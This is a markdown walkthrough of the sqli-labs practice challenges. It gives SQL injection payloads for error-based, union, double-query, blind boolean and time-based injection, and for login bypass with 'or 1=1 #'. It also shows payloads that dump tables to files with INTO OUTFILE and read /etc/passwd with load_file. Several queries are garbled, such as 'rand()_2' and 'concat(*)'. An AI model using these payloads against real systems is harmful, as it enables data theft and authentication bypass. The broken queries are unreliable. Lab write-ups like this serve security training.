# Web Exploitation

## SQLI Lab Challenges

### Challenge 1 --> GET Error Based Single Quotes String

- Input the Id as Parameter with numerical value.
- Use **\?variable name = value** after the URL.
- Here the variable name is **ID**.
- The value is any numerical value. **Eg : 1**
- Main Query is **Select * from TABLE where id='given_value';**
- With our input as 1 complete backend query will be 
```
SELECT * from table_name WHERE id=’1’ LIMIT 0,1
```

- With our input as 1’ complete backend query will be 
 ```
SELECT * from table_name WHERE id=’1’’ LIMIT 0,1
```
- which is syntactically incorrect and by giving input as, 

```
1’–+ (1 quote hyphen hyphen plus)
1’–%20 (%20 URL encoding for space)
1’%23 (%23 URL encoding for #)

--> %20 for. spaces  
--> %23 for. #
```

### Challenge 2 --> GET Error Based Integer Based

- Now we try to attack by putting in strings such as “abc“and “xyz” 
- We observe that for lesson 2 we receive an error from the database. 
- If we put id = 1' we again get an error in the Mysql server for incorrect syntax.  **You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘\’ LIMIT 0,1′ at line 1**
- Now the query which it changes to is

```
Select * from TABLE where id = 1’ ;
```
So we have an odd number of single quotes (‘), which breaks the query and takes it as an integer.

```
Select * from TABLE where id = (some integer value); ;
```

- To avoid such errors we can comment out the rest of the query.

**We inject the code with ?id=1′%20 --** 

( OR )

**We inject the code with ?id=1′%23 #** 

```
Select * from TABLE where id = 1’%20 -- ;

( OR )

Select * from TABLE where id = 1’%23 # ;
```
### Challenge 3 --> Error Based Single Quotes with twist String

- If we put some strings and number to check how the query is working we will get an error message **Server version for the right syntax to use near ””) LIMIT 0,1′ at line 1**

```
--> So the Query at Back End is,

Select login_name, select password from table where id= (‘our input here’)
```

**So if we inject the code with ?id=1′) –+****  

- To avoid such errors we can comment out the rest of the query.

```
Select * from TABLE where id = ('1’) -- ;
```

### Challenge 4 --> Error Based Double Quotes String

- If we put some strings and number to check how the query is working we will get an error message **Server version for the right syntax to user near '"1"") LIMIT 0,1' at line 1**

```
--> So the Query at Back End is,

Select login_name, password from table where id= ("our input here ")
```

**So if we inject the code with ?id=1") --+******  

- To avoid such errors we can comment out the rest of the query.

```
Select * from TABLE where id = ("1") -- ;
```

### Challenge 5 --> Fixing the Query without using Comments

- If we use the union select command to get more sensitive information from the database.  

```
--> In this query we use the version() function for detecting the database version; 

-6′ union select 5, version(),3 AND ‘1

--> Displays user Information
-6′ union select 5,current_user,3 AND ‘1
```

### Challenge 6 --> Double Query Injection

```
--> Using  --+ we shall see that the Query at the back is  

Select col1,col2,col3 from table where id='3 ' OR  '1 '
```

```
--> The count function, which just returns us the number of rows.

select count(*) from information_schema.tables;

--> By using this function we get a random value between 1 and 0.

select rand() ;

--> Using group by clause we shall group the table. 

select table_name, table_schema from information_schema.tables group by table_schema

--> Select the database. 
--> It shows our current database security.

select database();

--> We concatenate the output with the query.

select concat((select database()));

--> Adding hex value for a column.

select concat(0x3a,0x3a(select database()),0x3a,0x3a);

--> Rename the lengthier string name to smaller one.
--> Here 'a' is given. 

select concat(0x3a,0x3a(select database()),0x3a,0x3a) a;

--> Add randomness to it.

select concat(0x3a,0x3a(select database()),0x3a,0x3a, floor (rand()_2)) a;

--> Add multiple values by defining any random table.

concat(0x3a,0x3a(select database()),0x3a,0x3a, floor (rand()_2)) a from information_schema.columns;

--> Select tables or any database from information_schema.

select concat(0x3a,0x3a(select database()),0x3a,0x3a, floor (rand()_2)) a from information_schema.tables;

--> Add another column into the previous string and group the whole string.

select count(*), concat(0x3a,0x3a(select database()),0x3a,0x3a, floor (rand()_2)) a from information_schema.tables group by a;

--> If we try to execute the Query it gives the error with the database name security.
--> Display the version name.

select count(*), concat(0x3a,0x3a(select version()),0x3a,0x3a, floor (rand()_2)) a from information_schema.columns group by a;

--> After using the query a few times it generates an sql error message with username.

Select count(*), concat(0x3a,0x3a(select user()),0x3a,0x3a, floor (rand()_2)) a from information_schema.columns group by a;

--> By this technique we can dump the information from the database through the sql error message.
```

### Challenge 7 --> Dumping Database using Out File

- Break the sql query with **?id=1′–+**

```
--> Use the database security

use security;

--> Dump the database

select * from users;

--> Dump the database and ask mysql to write it into a file by using a function called outfile.

select * from users into outfile “/tmp/tests.txt”

--> Seeing the content of the test.txt file.

cat text.txt

--> There is another function, which is known as dump file. 
--> Dump file uses only a single row so we have to give it a limit for dumping the database.

select * from users limit 0,1 into dumpfile “/tmp/test2.txt”

--> Another function which is used is load file. 
--> It is used for loading files from the file system into mysql.

select load_file(“etc/passwd”);

--> It has dumped the passwd file.
--> Combine both of them and dump the combination into an outfile. 

select load_file(“etc/passwd”) into outfile “tmp/test4.txt”;

--> See the test4.txt file.
--> Typing this query into the address bar,  

?id=2′)) union select 1,2,3 into outfile “/var/www/sqli-labs/Less-7/union2.txt” –+
```

### Challenge 8 --> Blind Boolean Based Single Quotes

```
--> We know 1 is not equal to 1 hence database answer as ‘TRUE’ query.

SELECT * from table_name WHERE id=1' AND 1=1

--> We know 1 is not equal to 0 hence database answer as ‘FALSE’ query.

SELECT * from table_name WHERE id=1' AND 1=0

--> Test the condition whether the length of string for the first table is greater than 5 or not.

http://localhost/sqli-labs/Less-8/?id=1)' AND (length((select table_name from information_schema.tables where table_schema=database() limit 0,1))) > 5 --+
```

### Challenge 9 & 10 --> Blind Injection Time Based

```
--> We get the response 10 seconds after giving us the result that a database security exists. This is also known as a time-based SQL query.

((select database()=”security”, sleep(10), null);

--> There is no time-based response from the SQL server which means that such a database does not exist.

((select database()=”securi”, sleep(10), null);  
```

### Challenge 11 & 12 --> Post Error-based single & double quotes

- By trying various SQL Injections we come to know that the Query being used in Back End is ,

```
Select * from TABLE where username= (“$uname”) and password=(“$password”) LIMIT 0,1
```
- If we comment the rest after **Username** then we will be able to get **Login**.
```
Username = “) or 1=1 #

( OR )

Username = “) or 1=1 LIMIT 2,1 #
```

### Challenge 13 & 14 --> Double Injection Single Quotes with String

- Use **” or 1 #** to bypass the login and the reason is that the 1 used after OR resolves to true and as a result we have successful query. 
- The password is not matched since we commented out the rest of the query.

```
--> Select the database and dumps it as a string.

concat((select database()));

--> Add the floor and random function to it.

select concat((select database() ), floor(rand(0)*2 ));

--> Security is being concatenated in the output.
--> Blind the Query and concat the query to use it in the Username.

select 1 from (select concat(*), ( concat((select database() ), floor(rand(0)*2 ))c from information_schema.tables group by c)a;
```

### Challenge 15 --> Blind Boolean Time Based with Single and Double Quotes

-  The Query **1 AND 1=1** will have the Boolean value 1, which equals to TRUE, since an AND function is involved.

```
--> Using Boolean-based blind SQL injections if we try using 

“) or OR sleep(15) #

the query at back end becomes,

select col1, col2 from TABLE where username= (” “) or sleep(15)”) and password=(” user data”);

--> Since the **“)** does not result in TRUE, the AND statement fails and the OR statement executes successfully.
```

- Now if we change our AND query to **admin”) or OR sleep(15)** our query gets successfully executed.

#### References --> https://github.com/Audi-1/sqli-labs